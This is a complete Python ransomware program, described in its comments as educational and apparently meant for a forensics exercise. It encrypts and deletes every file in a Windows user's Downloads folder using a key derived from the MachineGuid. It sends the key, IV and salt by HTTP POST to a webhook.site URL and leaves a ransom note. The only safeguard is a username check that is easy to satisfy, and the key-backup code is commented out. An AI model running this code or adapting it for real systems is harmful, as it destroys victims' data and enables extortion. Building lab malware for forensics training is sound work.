# (This isn't a docstring so it doesn't get compiled into the executable.)
#
# Simple ransomware that encrypts the Downloads folder with AES-CBC-128. The
# key is derived from the MachineGuid in the Windows registry, and the IV is
# a random 16-byte value sent over the network. Both are sent to a remote
# server through an HTTP request.
#
# We acknowledge that much of this code has been generated by ChatGPT/Claude.
# This program is intended for educational purposes only.

import os
import time
import winreg
from pathlib import Path
from textwrap import dedent

import requests
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2
from Cryptodome.Util.Padding import pad

# The key and IV are sent to this endpoint as a POST request. This is intended
# to be the URL of an HTTP server that receives the key and IV for decryption
# if/when the user pays up. The expectation is that network traffic will be
# captured as part of the scenario.
#
# For testing, we just send it to webhook.site, which is a service that provides
# temporary URLs to receive web requests for free.
REMOTE_URL = "http://webhook.site/0d3b5b2f-b359-45c6-b44d-8aefc32b7929"


def get_downloads_path() -> Path:
    user_profile = os.getenv("USERPROFILE")
    if user_profile is None:
        raise RuntimeError("USERPROFILE environment variable not set?")

    return Path(user_profile) / "Downloads"


def get_machine_guid() -> str:
    """
    Retrieves the MachineGuid from the Windows registry.

    Returns:
        str: The MachineGuid value

    Raises:
        RuntimeError: If the registry key cannot be accessed or the value doesn't exist
    """
    try:
        key_path = "SOFTWARE\\Microsoft\\Cryptography"
        registry_key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_path, 0, winreg.KEY_READ
        )
        machine_guid, _ = winreg.QueryValueEx(registry_key, "MachineGuid")
        winreg.CloseKey(registry_key)

        assert isinstance(machine_guid, str)
        return machine_guid
    except WindowsError as e:
        raise RuntimeError(f"Failed to retrieve MachineGuid from registry: {e}")


def check_username(target: str) -> bool:
    """
    Check if the username is "user".
    """
    username = os.getenv("USERNAME")
    if username is None:
        raise RuntimeError("USERNAME environment variable not set??")
    return username == target


if __name__ == "__main__":
    # Just for safety.
    if not check_username("user"):
        raise RuntimeError(
            "This program will only run if the username is 'user'. Exiting."
        )

    # print("Encryption will start in 5 seconds. Press Ctrl+C to cancel.")
    # time.sleep(5)

    # Derive the key from the MachineGuid and a random salt.
    salt = os.urandom(16)
    key = PBKDF2(str(get_machine_guid()).encode(), salt, 32, 1000000)

    # The IV is a random 16-byte value also sent over the network.
    iv = os.urandom(16)

    # Encrypt each file in the Downloads folder.
    downloads_path = get_downloads_path().resolve()

    print(f"Encrypting files in {downloads_path}...")
    for file in downloads_path.iterdir():
        if not file.is_file():
            continue
        if file.suffix == ".enc":
            print(f"Skipping {file} (already encrypted)")
            continue

        try:
            with open(file, "rb") as fp1:
                data = fp1.read()

            cipher = AES.new(key, AES.MODE_CBC, iv=iv)
            ciphertext = cipher.encrypt(pad(data, 16))

            # Write as <file>.enc
            print(f"Encrypting {file}...")
            with open(file.with_suffix(f"{file.suffix}.enc"), "wb") as fp2:
                fp2.write(ciphertext)

            # Delete the original file
            print(f"Deleting {file}...")
            file.unlink()
        except PermissionError:
            # Too bad, the file's probably open or something
            print(f"Couldn't encrypt/delete {file} (no permissions)")
            continue
        except Exception as e:
            print(f"Error processing {file}: {e}")
            continue

        # print(f"Deleting {file}...")
        # try:
        #     # Delete the original file
        #     file.unlink()
        # except PermissionError:
        #     # Too bad, the file's probably open or something
        #     print(f"Skipping {file} (can't delete)")
        #     continue

    # Send encryption information to the remote server.
    print("Sending IV and key to server...")
    requests.post(
        REMOTE_URL,
        json={
            "id": get_machine_guid(),
            "iv": iv.hex(),
            "salt": salt.hex(),
            "key": key.hex(),
        },
    )

    # Write a ransom note to the Downloads folder.
    ransom_note = dedent(
        f"""
        Your files have been encrypted.
        
        Please send two pictures of your cat to cats@example.com within 24 hours.
        If you don't, your files can never be recovered.
        
        Include your identifier, "{get_machine_guid()}", in the email.
        """
    )

    with open(downloads_path / "ransom.txt", "wt") as fp3:
        fp3.write(ransom_note)

    # Allow ransomware to run in the background for a bit before exiting (allows
    # it to be caught in the volatile memory dump)
    time.sleep(120)

    # Just for safety - we write the key and IV to a file in the Downloads
    # folder. Obviously a real ransomware won't do this, but this is to help
    # with recovery if you accidentally run this on a real machine.
    # with open(downloads_path / f"key_{get_machine_guid()}.txt", "wt") as fp4:
    #     key_data = dedent(
    #         f"""
    #         Key: {key.hex()}
    #         IV: {iv.hex()}
    #         Salt: {salt.hex()}
    #         Machine GUID: {get_machine_guid()}
    #         """
    #     )
    #     fp4.write(key_data.encode("utf-8").hex() + "\n\n")

    #     fp4.write("If the key and IV are lost, you can decode the parameters above.")
